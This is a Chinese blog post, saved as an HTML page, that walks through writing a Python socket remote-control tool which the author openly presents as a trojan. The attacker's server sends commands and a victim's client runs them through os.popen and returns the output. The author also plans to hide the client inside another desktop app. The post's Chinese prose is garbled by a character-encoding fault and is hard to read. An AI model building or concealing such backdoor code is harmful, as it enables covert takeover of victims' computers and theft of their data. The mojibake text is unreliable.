<!DOCTYPE html>
<html lang="zh-cn">

<head>
  <meta charset="UTF-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">

  
  <meta name="author" content="LiuChao">

  
  
  <meta name="description" content="ä¸€ä¸ªç”±Pythonè¯­è¨€ç¼–å†™çš„åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº">
  

  
  <link rel="icon" href="https://blog.pi3.fun/favicon.ico">

  
  
  <meta name="keywords" content=" study  latex  life  academic ">
  

  
  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css"
  integrity="sha384-KiWOvVjnN8qwAZbuQyWDIbfCLFhLXNETzBQjA/92pIowpC0d2O3nppDGQVgwd2nB" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js"
  integrity="sha384-0fdwu/T/EQMsQlrHCCHoH10pkPLlKA1jL5dFyUOvB3lfeT2540/2g6YgSi2BL14p" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js"
  integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
<script>
  document.addEventListener("DOMContentLoaded", function () {
    renderMathInElement(document.body, {
      delimiters: [
        { left: '$$', right: '$$', display: true },
        { left: '\\[', right: '\\]', display: true },
        { left: '$', right: '$', display: false },
        { left: '\\(', right: '\\)', display: false }
      ],
      ignoredTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code', 'option'],
      throwOnError: false
    });
  });
</script>


  

  
  <meta property="og:url" content="https://blog.pi3.fun/post/2023/11/%E5%9F%BA%E4%BA%8Esocket%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F/">
  <meta property="og:site_name" content="Pi3&#39;Notes">
  <meta property="og:title" content="åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº">
  <meta property="og:description" content="ä¸€ä¸ªç”±Pythonè¯­è¨€ç¼–å†™çš„åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº">
  <meta property="og:locale" content="zh_cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2023-11-29T00:00:00+00:00">
    <meta property="article:modified_time" content="2023-11-29T00:00:00+00:00">
    <meta property="article:tag" content="Python">
    <meta property="article:tag" content="Socket">


  
  <link rel="canonical" href="https://blog.pi3.fun/post/2023/11/%E5%9F%BA%E4%BA%8Esocket%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F/">

  
  
  
  <meta itemprop="name" content="åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº">
  <meta itemprop="description" content="ä¸€ä¸ªç”±Pythonè¯­è¨€ç¼–å†™çš„åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº">
  <meta itemprop="datePublished" content="2023-11-29T00:00:00+00:00">
  <meta itemprop="dateModified" content="2023-11-29T00:00:00+00:00">
  <meta itemprop="wordCount" content="5259">
  <meta itemprop="keywords" content="Python,Socket">

  
  <link media="screen" rel="stylesheet" href='https://blog.pi3.fun/css/common.css'>
  <link media="screen" rel="stylesheet" href='https://blog.pi3.fun/css/content.css'>

  
  
  <title>åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº - Pi3&#39;Notes</title>
  

  
  

  
<link rel="stylesheet" href='https://blog.pi3.fun/css/single.css'>

</head>

<body>
  <div id="wrapper">
    <header id="header">
  <h1>
    <a href="https://blog.pi3.fun/">Pi3&#39;Notes</a>
  </h1>

  <nav>
    
    <span class="nav-bar-item">
      <a class="link" href="/">ä¸»é¡µ</a>
    </span>
    
    <span class="nav-bar-item">
      <a class="link" href="/articles/">æ–‡ç« </a>
    </span>
    
    <span class="nav-bar-item">
      <a class="link" href="/post/">å½’æ¡£</a>
    </span>
    
    <span class="nav-bar-item">
      <a class="link" href="/about/">å…³äº</a>
    </span>
    
  </nav>
</header>

    
<main id="main" class="post">
  
  
  <h1>åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº</h1>
  
  <div>
    <b>Keywords: </b>
    
    <a class="link" href='https://blog.pi3.fun/tags/python'>#Python</a>
    
    <a class="link" href='https://blog.pi3.fun/tags/socket'>#Socket</a>
    
  </div>
  
  
  
  <details>
    <summary>
      <b>Table of Contents</b>
    </summary>
    <div class="toc"><nav id="TableOfContents">
  <ul>
    <li><a href="#æ¦‚è¿°">æ¦‚è¿°</a></li>
    <li><a href="#å®ç°è¿‡ç¨‹">å®ç°è¿‡ç¨‹</a>
      <ul>
        <li><a href="#æœ€ç®€å•çš„socketç¨‹åº">æœ€ç®€å•çš„Socketç¨‹åº</a></li>
        <li><a href="#è¿œç¨‹å‘½ä»¤æ‰§è¡Œ">è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</a></li>
        <li><a href="#è¿œç¨‹ä¸‹è½½æ–‡ä»¶">è¿œç¨‹ä¸‹è½½æ–‡ä»¶</a></li>
        <li><a href="#è¿œç¨‹ä¸Šä¼ æ–‡ä»¶">è¿œç¨‹ä¸Šä¼ æ–‡ä»¶</a></li>
        <li><a href="#è¿œç¨‹è·å–å±å¹•æˆªå›¾">è¿œç¨‹è·å–å±å¹•æˆªå›¾</a></li>
        <li><a href="#è·å–å¾®ä¿¡æ•°æ®">è·å–å¾®ä¿¡æ•°æ®</a></li>
      </ul>
    </li>
    <li><a href="#æœ¨é©¬ç¨‹åº">æœ¨é©¬ç¨‹åº</a>
      <ul>
        <li><a href="#peppa-pig">peppa-pig</a></li>
        <li><a href="#é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯">é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯</a></li>
      </ul>
    </li>
    <li><a href="#æ€»ç»“">æ€»ç»“</a></li>
  </ul>
</nav></div>
  </details>
  
  
  <article class="content">
    
    <blockquote>
<p>ä¸€ä¸ªåŸºäºPython Socket å®ç°è¿œç¨‹æ§åˆ¶ç¨‹åº
å¯ä»¥ç”¨ä½œè¿œæ§æœ¨é©¬</p>
</blockquote>
<h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>
<p>å®ç°çš„åŠŸèƒ½ï¼š</p>
<ul>
<li>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</li>
<li>è¿œç¨‹æ–‡ä»¶ä¸Šä¼ </li>
<li>è¿œç¨‹æ–‡ä»¶ä¸‹è½½</li>
<li>è·å–è¿œç¨‹ä¸»æœºæˆªå±</li>
</ul>
<p>åœ¨å­¦ä¹ ç½‘ç»œå®‰å…¨æŠ€æœ¯çš„è¿‡ç¨‹ä¸­ï¼Œäº†è§£åˆ°äº†è®¡ç®—æœºç—…æ¯’ã€è •è™«å’Œæœ¨é©¬ç­‰çŸ¥è¯†ï¼Œè¿™å…¶ä¸­æœ¨é©¬åº”è¯¥æ˜¯æœ€å¥½å®ç°çš„ä¸€ä¸ªï¼Œäºæ˜¯ä¾¿æƒ³åˆ°å†™ä¸€ä¸ªæœ¨é©¬</p>
<p>åœ¨ä¼—å¤šæœ¨é©¬çš„ç±»å‹ä¸­ï¼Œç»“åˆå­¦ä¹ åˆ°çš„ç½‘ç»œç¼–ç¨‹çŸ¥è¯†ï¼Œäºæ˜¯ä¾¿æœ‰äº†è¿™ä¸€ä¸ªåŸºäºSocketå®ç°çš„è¿œç¨‹æ§åˆ¶ç¨‹åº</p>
<p>åœ¨åç»­ï¼Œå¯ä»¥å°†è¿™ä¸ªè¿œæ§ç¨‹åºå†™å…¥å…¶ä»–å®¢æˆ·ç«¯ç¨‹åºä¸­ï¼ˆæ¯”å¦‚ä¹‹å‰çš„é‡å­åŠ å¯†ç½‘ç›˜é¡¹ç›®ï¼‰ï¼Œåªè¦å¯¹æ–¹æ‰“å¼€äº†æ¡Œé¢ç¨‹åºï¼Œå°±èƒ½è¿œç¨‹è¿æ¥</p>
<h2 id="å®ç°è¿‡ç¨‹">å®ç°è¿‡ç¨‹</h2>
<h3 id="æœ€ç®€å•çš„socketç¨‹åº">æœ€ç®€å•çš„Socketç¨‹åº</h3>
<p>é¦–å…ˆï¼Œæ•´ä¸ªç¨‹åºçš„æ¡†æ¶å°±æ˜¯åŸºäºSocketçš„TCPä¼ è¾“ï¼Œå…ˆå†™ä¸€ä¸ªæœ€ç®€å•çš„Socketç¨‹åº</p>
<p><strong>Serverç«¯ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">import</span> <span style="color:#000">socket</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#000">socket_server</span> <span style="color:#000">=</span> <span style="color:#000">socket</span><span style="color:#000">.</span><span style="color:#000">socket</span>()
</span></span><span style="display:flex;"><span><span style="color:#000">socket_server</span><span style="color:#000">.</span><span style="color:#000">bind</span>((<span style="color:#c41a16">&#39;localhost&#39;</span>, <span style="color:#1c01ce">8888</span>))
</span></span><span style="display:flex;"><span><span style="color:#000">socket_server</span><span style="color:#000">.</span><span style="color:#000">listen</span>(<span style="color:#1c01ce">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#000">conn</span>, <span style="color:#000">address</span> <span style="color:#000">=</span> <span style="color:#000">socket_server</span><span style="color:#000">.</span><span style="color:#000">accept</span>()
</span></span><span style="display:flex;"><span><span style="color:#a90d91">print</span>(<span style="color:#c41a16">f</span><span style="color:#c41a16">&#39;æ¥æ”¶åˆ°å®¢æˆ·ç«¯è¿æ¥ï¼Œæ¥è‡ª</span><span style="color:#c41a16">{</span><span style="color:#000">address</span><span style="color:#c41a16">}</span><span style="color:#c41a16">&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a90d91">while</span> <span style="color:#a90d91">True</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#000">data</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">1024</span>)<span style="color:#000">.</span><span style="color:#000">decode</span>(<span style="color:#c41a16">&#34;UTF-8&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">data</span> <span style="color:#000">==</span> <span style="color:#c41a16">&#39;exit&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">print</span>(<span style="color:#c41a16">&#39;æ¥æ”¶åˆ°å‘æ¥çš„æ¶ˆæ¯ï¼š&#39;</span>, <span style="color:#000">data</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#000">reply</span> <span style="color:#000">=</span> <span style="color:#a90d91">input</span>(<span style="color:#c41a16">&#39;è¯·è¾“å…¥å›å¤çš„æ¶ˆæ¯ï¼š&#39;</span>)<span style="color:#000">.</span><span style="color:#000">encode</span>(<span style="color:#c41a16">&#39;UTF-8&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#000">reply</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">close</span>()
</span></span><span style="display:flex;"><span><span style="color:#000">socket_server</span><span style="color:#000">.</span><span style="color:#000">close</span>()
</span></span></code></pre></div><p><strong>Clientç«¯ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">import</span> <span style="color:#000">socket</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#000">socker_client</span> <span style="color:#000">=</span> <span style="color:#000">socket</span><span style="color:#000">.</span><span style="color:#000">socket</span>()
</span></span><span style="display:flex;"><span><span style="color:#000">socker_client</span><span style="color:#000">.</span><span style="color:#000">connect</span>((<span style="color:#c41a16">&#39;localhost&#39;</span>, <span style="color:#1c01ce">8888</span>))
</span></span><span style="display:flex;"><span><span style="color:#a90d91">print</span>(<span style="color:#c41a16">&#39;è¿æ¥åˆ°æœåŠ¡ç«¯&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a90d91">while</span> <span style="color:#a90d91">True</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#000">send_msg</span> <span style="color:#000">=</span> <span style="color:#a90d91">input</span>(<span style="color:#c41a16">&#39;è¯·è¾“å…¥è¦å‘é€çš„æ¶ˆæ¯ï¼š&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">send_msg</span> <span style="color:#000">==</span> <span style="color:#c41a16">&#39;exit&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">socker_client</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#000">send_msg</span><span style="color:#000">.</span><span style="color:#000">encode</span>(<span style="color:#c41a16">&#39;UTF-8&#39;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#000">recv_data</span> <span style="color:#000">=</span> <span style="color:#000">socker_client</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">1024</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">print</span>(<span style="color:#c41a16">&#39;æœåŠ¡ç«¯å›å¤çš„æ¶ˆæ¯ï¼š&#39;</span>, <span style="color:#000">recv_data</span><span style="color:#000">.</span><span style="color:#000">decode</span>(<span style="color:#c41a16">&#39;UTF-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#000">socker_client</span><span style="color:#000">.</span><span style="color:#000">close</span>()
</span></span></code></pre></div><p>ä»¥ä¸Šæ˜¯æœ€ç®€å•çš„ä¸€ä¸ªSocketç¨‹åºï¼Œå®ç°äº†ä¸¤å°ä¸»æœºä¹‹é—´ç›¸äº’ä¼ é€’æ–‡å­—ä¿¡æ¯ã€‚</p>
<p>ä½†æ˜¯åœ¨è¿™ä¸ªç¨‹åºä¸­ï¼ŒåŒæ ·å­˜åœ¨å¾ˆå¤šçš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼š</p>
<ol>
<li>ä¼ è¾“çš„æ¶ˆæ¯å¯èƒ½ä¼šè¶…è¿‡1024</li>
<li>æ²¡æœ‰ä»»ä½•å¼‚å¸¸æŠ›å‡ºæœºåˆ¶ï¼Œåœ¨Socketé€šä¿¡çš„è¿‡ç¨‹ä¸­ï¼Œä¸€å®šä¼šå­˜åœ¨ä¸¢åŒ…ã€å¤±å»è¿æ¥ã€è¶…æ—¶ç­‰é—®é¢˜</li>
<li>â€¦â€¦â€¦â€¦</li>
</ol>
<p>è¿™äº›é—®é¢˜å¦‚æœåªæ˜¯åœ¨ä¸Šé¢è¿™æ ·ä¸€ä¸ªç®€å•ç¨‹åºä¸­ï¼ŒåŸºæœ¬ä¸ä¼šæœ‰é—®é¢˜ï¼Œä½†æ˜¯ä¸€æ—¦ç¨‹åºå®ç°çš„åŠŸèƒ½å¤šäº†ï¼Œä»£ç é‡å¤§äº†ï¼Œè¿™äº›é—®é¢˜éƒ½è‡³å…³é‡è¦ï¼Œéƒ½éœ€è¦åœ¨åç»­çš„ä»£ç ä¸­æ³¨æ„ï¼Œä¸ç„¶æ‰¾bugä¼šå¾ˆç—›è‹¦ğŸ˜¢</p>
<blockquote>
<p>éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼Œåœ¨æ­¤ç¨‹åºä¸­ï¼Œæˆ‘å°†æœåŠ¡ç«¯ä½œä¸ºä¸»åŠ¨æ‰§è¡Œç«¯ï¼Œå®¢æˆ·ç«¯ä½œä¸ºè¢«åŠ¨æ‰§è¡Œç«¯ï¼Œä¹Ÿå°±æ˜¯æœåŠ¡ç«¯å‘é€æŒ‡ä»¤ï¼Œå®¢æˆ·ç«¯æ ¹æ®æŒ‡ä»¤è¿›è¡Œæ“ä½œå¹¶è¿”å›æœåŠ¡ç«¯</p>
<p>å¯¹äºæœ¨é©¬ç¨‹åºï¼ŒåŒæ ·å¯ä»¥ç†è§£ä¸ºï¼ŒæœåŠ¡ç«¯ä¸ºæ”»å‡»æ“çºµè€…ï¼Œå®¢æˆ·ç«¯ä¸ºæ”»å‡»å—å®³è€…</p>
<p>åç»­çš„ä»‹ç»ä¸­ï¼Œéƒ½æ˜¯ä»¥æ­¤ä¸ºåŸºç¡€</p>
</blockquote>
<h3 id="è¿œç¨‹å‘½ä»¤æ‰§è¡Œ">è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h3>
<p>å­¦ä¼šä¸Šé¢æœ€ç®€å•çš„socketç¨‹åºä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ€è€ƒï¼Œæ€ä¹ˆå®ç°è¿œç¨‹çš„å‘½ä»¤æ‰§è¡Œ</p>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Pythonä¸­çš„osæ¨¡å—ï¼Œosæ¨¡å—æä¾›çš„å°±æ˜¯å„ç§ Python ç¨‹åºä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’çš„æ¥å£ã€‚é€šè¿‡ä½¿ç”¨osæ¨¡å—ï¼Œä¸€æ–¹é¢å¯ä»¥æ–¹ä¾¿åœ°ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œå¦ä¸€æ–¹é¢é¡µå¯ä»¥æå¤§å¢å¼ºä»£ç çš„å¯ç§»æ¤æ€§</p>
<p>Pythonä¸­çš„osæ¨¡å—ï¼Œç†è®ºä¸Šæ”¯æŒWindowsã€Linuxå’ŒMac OSç³»ç»Ÿï¼Œæ‰€ä»¥ä½¿ç”¨osæ¨¡å—ï¼Œä¹Ÿå¯ä»¥å¢å¤§æˆ‘ä»¬ç¼–å†™çš„è¿™ä¸ªç¨‹åºçš„ä½¿ç”¨èŒƒå›´</p>
<p>æ‰€ä»¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ•´ä½“æµç¨‹å’Œæ¡†æ¶ä¸ºï¼š</p>
<p>{% mermaid %}</p>
<p>graph TB</p>
<p>a(æœåŠ¡ç«¯ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥)&ndash;&gt;b(å®¢æˆ·ç«¯è¿æ¥ä¸ŠæœåŠ¡ç«¯)</p>
<p>b&ndash;&gt;c(æœåŠ¡ç«¯æ¥æ”¶åˆ°è¿æ¥å¹¶å‘é€æŒ‡ä»¤)</p>
<p>c&ndash;&gt;d(å®¢æˆ·ç«¯è§£ææŒ‡ä»¤å¹¶è°ƒç”¨OSæ¨¡å—æ‰§è¡Œ)</p>
<p>{% endmermaid %}</p>
<p>ä½¿ç”¨osæ¨¡å—è¿›è¡Œå‘½ä»¤ä¹Ÿååˆ†ç®€å•ï¼Œåªéœ€è¦ä½¿ç”¨ <code>os.system('å‘½ä»¤')</code> æˆ–è€… <code>os.popen('å‘½ä»¤')</code> å°±å¯ä»¥å®ç°.</p>
<p>ä½†æ˜¯ï¼Œè¿™é‡Œä¸èƒ½ä½¿ç”¨<code>os.system</code>ï¼Œæ¯”å¦‚æˆ‘ä»¬æ‰§è¡Œ<code>dir</code>å‘½ä»¤ï¼Œéœ€è¦è¿”å›æ–‡ä»¶å¤¹å†…çš„å†…å®¹ï¼Œ<font color="#00b0f0">å®ƒä¸èƒ½è¿”å›å‘½ä»¤æ‰§è¡Œåçš„å†…å®¹</font>ï¼Œè€Œ<code>os.popen</code>å¯ä»¥</p>
<blockquote>
<p>è¡¥å……ï¼š</p>
<p>pythonä¸­<code>os.system</code>ã€<code>os.popen</code>ã€<code>subprocess.popen</code>éƒ½æ˜¯å¯ä»¥å®ç°ç³»ç»Ÿå‘½ä»¤çš„æ‰§è¡Œ
ä½†æ˜¯ä»–ä»¬ä¹‹é—´ä¹Ÿå­˜åœ¨åŒºåˆ«ï¼Œ<a href="https://blog.csdn.net/bcfdsagbfcisbg/article/details/78134172">å‚è€ƒæ–‡ç« </a></p>
<p>æ€»ç»“ä¸€ä¸‹ï¼š</p>
<ol>
<li><code>os.system</code>ç›´æ¥è°ƒç”¨æ ‡å‡†Cçš„system() å‡½æ•°ï¼Œä»…ä»…åœ¨ä¸€ä¸ªå­ç»ˆç«¯è¿è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œä¸èƒ½è·å–å‘½ä»¤æ‰§è¡Œåçš„è¿”å›ä¿¡æ¯</li>
<li><code>os.popen</code>ä¸ä»…æ‰§è¡Œå‘½ä»¤è€Œä¸”è¿”å›æ‰§è¡Œåçš„ä¿¡æ¯å¯¹è±¡(å¸¸ç”¨äºéœ€è¦è·å–æ‰§è¡Œå‘½ä»¤åçš„è¿”å›ä¿¡æ¯)ï¼Œæ˜¯é€šè¿‡ä¸€ä¸ªç®¡é“æ–‡ä»¶å°†ç»“æœè¿”å›ã€‚è¿”å›çš„æ˜¯ file read çš„å¯¹è±¡ï¼Œå¯¹å…¶è¿›è¡Œè¯»å–<code>read</code>çš„æ“ä½œå¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„è¾“å‡º</li>
<li><code>subprocess.popen</code>ä¸<code>os.popen</code>ç±»ä¼¼ï¼Œä½†æ˜¯å½“æ‰§è¡Œå‘½ä»¤çš„å‚æ•°æˆ–è€…è¿”å›ä¸­åŒ…å«äº†ä¸­æ–‡æ–‡å­—ï¼Œæ›´å»ºè®®ä½¿ç”¨<code>subprocess</code></li>
<li><code>commands</code>å¯ä»¥è·å–è¿”å›å€¼å’Œå‘½ä»¤çš„è¾“å‡ºç»“æœ</li>
</ol>
</blockquote>
<p>æ‰€ä»¥åœ¨è¿™ä¸ªåŠŸèƒ½å®ç°ä¸­ï¼Œæˆ‘é€‰æ‹©ä½¿ç”¨ <code>os.popen</code> æ–¹æ³•æ¥å®ç°å‘½ä»¤æ‰§è¡Œï¼Œä½¿ç”¨ <code>read</code> æ–¹æ³•è¯»å–è¿”å›çš„å†…å®¹</p>
<p><strong>Clientç«¯æ‰§è¡Œå‘½ä»¤å‡½æ•°:</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">def</span> <span style="color:#000">run_cmd</span>(<span style="color:#000">socker_client</span>, <span style="color:#000">cmd</span>):  
</span></span><span style="display:flex;"><span>    <span style="color:#000">pwd</span> <span style="color:#000">=</span> <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">getcwd</span>()  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">cmd</span><span style="color:#000">.</span><span style="color:#000">startswith</span>(<span style="color:#c41a16">&#39;cd&#39;</span>):  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">try</span>:  
</span></span><span style="display:flex;"><span>            <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">chdir</span>(<span style="color:#000">cmd</span><span style="color:#000">.</span><span style="color:#000">split</span>()[<span style="color:#1c01ce">1</span>])  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">except</span> <span style="color:#000">FileNotFoundError</span>:  
</span></span><span style="display:flex;"><span>            <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">chdir</span>(<span style="color:#000">pwd</span>)  
</span></span><span style="display:flex;"><span>            <span style="color:#000">result</span> <span style="color:#000">=</span> <span style="color:#c41a16">&#39;ç›®å½•ä¸å­˜åœ¨&#39;</span>  
</span></span><span style="display:flex;"><span>            <span style="color:#000">socker_client</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#000">result</span><span style="color:#000">.</span><span style="color:#000">encode</span>(<span style="color:#c41a16">&#39;UTF-8&#39;</span>))  
</span></span><span style="display:flex;"><span>            <span style="color:#a90d91">return</span>  
</span></span><span style="display:flex;"><span>        <span style="color:#000">result</span> <span style="color:#000">=</span> <span style="color:#c41a16">&#39;åˆ‡æ¢ç›®å½•æˆåŠŸ&#39;</span>  
</span></span><span style="display:flex;"><span>        <span style="color:#000">socker_client</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#000">result</span><span style="color:#000">.</span><span style="color:#000">encode</span>(<span style="color:#c41a16">&#39;UTF-8&#39;</span>))  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">return</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># æ‰§è¡Œå‘½ä»¤  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">try</span>:  
</span></span><span style="display:flex;"><span>        <span style="color:#000">result</span> <span style="color:#000">=</span> <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">popen</span>(<span style="color:#000">cmd</span>)<span style="color:#000">.</span><span style="color:#000">read</span>()  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">except</span> <span style="color:#000">Exception</span> <span style="color:#a90d91">as</span> <span style="color:#000">e</span>:  
</span></span><span style="display:flex;"><span>        <span style="color:#000">result</span> <span style="color:#000">=</span> <span style="color:#c41a16">f</span><span style="color:#c41a16">&#39;å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼š</span><span style="color:#c41a16">{</span><span style="color:#000">e</span><span style="color:#c41a16">}</span><span style="color:#c41a16">&#39;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">result</span> <span style="color:#000">==</span> <span style="color:#c41a16">&#39;&#39;</span>:  
</span></span><span style="display:flex;"><span>        <span style="color:#000">result</span> <span style="color:#000">=</span> <span style="color:#c41a16">&#39;å‘½ä»¤æ‰§è¡ŒæˆåŠŸ&#39;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># æŠŠå‘½ä»¤å›æ˜¾ç»“æœå‘é€ç»™æœåŠ¡ç«¯  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">socker_client</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#000">result</span><span style="color:#000">.</span><span style="color:#000">encode</span>(<span style="color:#c41a16">&#39;UTF-8&#39;</span>))
</span></span></code></pre></div><p>ä»ä¸Šé¢è¿™ä¸ªå‡½æ•°å®ç°ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ç‰¹æ„å¯¹ <code>cd</code> åˆ‡æ¢ç›®å½•å‘½ä»¤åšäº†å•ç‹¬çš„åˆ¤æ–­</p>
<p>è¿™æ˜¯å› ä¸ºåœ¨Pythonç¨‹åºä¸­ç›´æ¥æ‰§è¡Œ <code>cd</code> åˆ‡æ¢ç›®å½•æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œè¿˜æ˜¯ä¼šè¿”å›å½“å‰ç¨‹åºè¿è¡Œçš„ç›®å½•ä½ç½®ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ <code>os.chdir</code> æ–¹æ³•å¯¹å½“å‰Pythonç¨‹åºè¿è¡Œçš„ç›®å½•è¿›è¡Œåˆ‡æ¢</p>
<p>é™¤æ­¤ä¹‹å¤–çš„å…¶ä»–å‘½ä»¤åˆ™æ²¡æœ‰è¿›è¡Œå•ç‹¬çš„åˆ¤æ–­ï¼Œç›´æ¥äº¤ç»™ <code>popen</code> æ‰§è¡Œï¼Œå¹¶ç”¨ <code>read</code> æ–¹æ³•è¯»å–è¿”å›ä¿¡æ¯</p>
<blockquote>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<code>popen</code>åœ¨æ‰§è¡Œå…¶ä»–å‘½ä»¤ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„è¿”å›å€¼ï¼Œå¯èƒ½ä¼šä¸è¿”å›å€¼ï¼Œå¹¶ä¸”ä¸€ç›´é˜»å¡ï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µå•ç‹¬åˆ¤æ–­</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214229.png" alt="è¿œç¨‹æ‰§è¡Œå‘½ä»¤"></p>
<h3 id="è¿œç¨‹ä¸‹è½½æ–‡ä»¶">è¿œç¨‹ä¸‹è½½æ–‡ä»¶</h3>
<p>è¿œç¨‹ä¸‹è½½æ–‡ä»¶ï¼Œéœ€è¦çš„æ˜¯æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ç´§å¯†é…åˆï¼Œå¹¶ä¸”ä¿è¯é€šä¿¡è¿‡ç¨‹ä¸­çš„åŒæ­¥</p>
